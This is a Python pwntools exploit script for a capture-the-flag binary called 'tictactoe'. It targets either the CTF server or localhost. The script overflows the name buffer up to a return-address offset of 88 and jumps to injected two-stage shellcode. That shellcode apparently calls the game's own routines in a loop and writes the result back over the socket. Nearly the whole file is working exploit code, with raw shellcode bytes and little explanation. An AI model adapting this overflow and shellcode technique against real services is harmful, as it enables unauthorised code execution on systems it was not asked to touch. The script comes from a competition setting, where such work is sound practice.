from pwn import *


###############################################################################
### Constants found by manual enumeration
###############################################################################
RA_OFST = 88
SHELLCODE_PART_1 = b'\x54\xc3'
SHELLCODE_PART_2 = b"\x48\x8b\x3c\x25\x28\x57\x40\x00\xbe\x40\x57\x40\x00\xb8\x35\x28\x40\x00\xff\xd0\x48\x31\xdb\x48\x8b\x3c\x25\x28\x57\x40\x00\xbe\x40\x57\x40\x00\xba\x00\x00\x00\x00\xb9\x01\x00\x00\x00\xb8\x74\x2a\x40\x00\xff\xd0\x48\x8b\x3c\x25\x28\x57\x40\x00\xbe\x40\x57\x40\x00\xba\x03\x00\x00\x00\xb9\x04\x00\x00\x00\xb8\x74\x2a\x40\x00\xff\xd0\x48\x8b\x3c\x25\x28\x57\x40\x00\xbe\x40\x57\x40\x00\xba\x02\x00\x00\x00\xb9\x07\x00\x00\x00\xb8\x74\x2a\x40\x00\xff\xd0\x48\xff\xc3\x48\x83\xfb\x64\x75\x9d\x48\x8b\x3c\x25\x28\x57\x40\x00\xbe\x40\x57\x40\x00\xba\x70\x58\x40\x00\xb8\xe1\x2c\x40\x00\xff\xd0\xbf\x04\x00\x00\x00\xbe\x70\x58\x40\x00\xba\x02\x01\x00\x00\xb8\x01\x00\x00\x00\x0f\x05"

###############################################################################
### Setup the environment
###############################################################################
# context.log_level = 'debug'

e = ELF('./tictactoe')
if len(sys.argv) >= 2 and sys.argv[1] == 'remote':
    p = remote('pwn-tictactoe.ctfz.one', 8889)
else:
    p = remote('127.0.0.1', 8889)

if len(sys.argv) >= 3 and sys.argv[2] == 'debug':
    gdb.attach(p)
    raw_input(b'Continue and press ENTER key to send payload')



###############################################################################
### Exploit
###############################################################################
# Shellcode one will be placed inside name buf. We will jump to it. It cannot 
# contain any null bytes. It just has to change the flow to the stack under
# the return address where the second part of shellcode lies at.
# We will use this part of shellcode to communicate with a server.
# It can contain null bytes.
#
###############################################################################
payload = SHELLCODE_PART_1
payload = payload.ljust(RA_OFST, b'X')
payload += p64(e.symbols['name'])
payload += SHELLCODE_PART_2
payload += b'X' * 8
p.sendlineafter(b'Welcome to tictactoe game! Please, enter your name: ', payload)

p.interactive()